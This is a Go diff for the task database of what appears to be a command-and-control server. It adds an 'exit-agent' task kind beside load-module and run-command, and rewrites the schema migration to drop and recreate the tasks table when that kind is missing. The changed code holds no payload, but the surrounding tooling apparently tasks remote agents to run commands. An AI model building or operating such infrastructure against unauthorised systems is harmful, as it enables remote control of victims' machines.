@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"os"
 	"path/filepath"
+	"strings"
 
 	_ "github.com/glebarez/go-sqlite"
 	"golang.org/x/crypto/argon2"
@@ -18,7 +19,7 @@ const tasksSchema = `CREATE TABLE IF NOT EXISTS tasks(
 	  ClientID    INTEGER NOT NULL,
 	  CampaignID  TEXT NOT NULL,
 	  Kind        TEXT NOT NULL CHECK (Kind IN
-	               ('load-module','unload-module','list-modules','run-command')),
+	               ('load-module','unload-module','list-modules','run-command','exit-agent')),
 	  Module      TEXT,
 	  ModuleID    INTEGER,
 	  Command     TEXT,
@@ -193,7 +194,18 @@ func migrateTasks(conn *sql.DB) error {
 		return err
 	}
 	rows.Close()
-	if exists && legacy {
+	if !exists {
+		return nil
+	}
+
+	var schema sql.NullString
+	if err := conn.QueryRow(`SELECT sql FROM sqlite_master WHERE type = 'table' AND name = 'tasks'`).Scan(&schema); err != nil {
+		if err == sql.ErrNoRows {
+			return nil
+		}
+		return err
+	}
+	if legacy || !schema.Valid || !strings.Contains(schema.String, "exit-agent") {
 		if _, err := conn.Exec(`DROP TABLE tasks`); err != nil {
 			return err
 		}
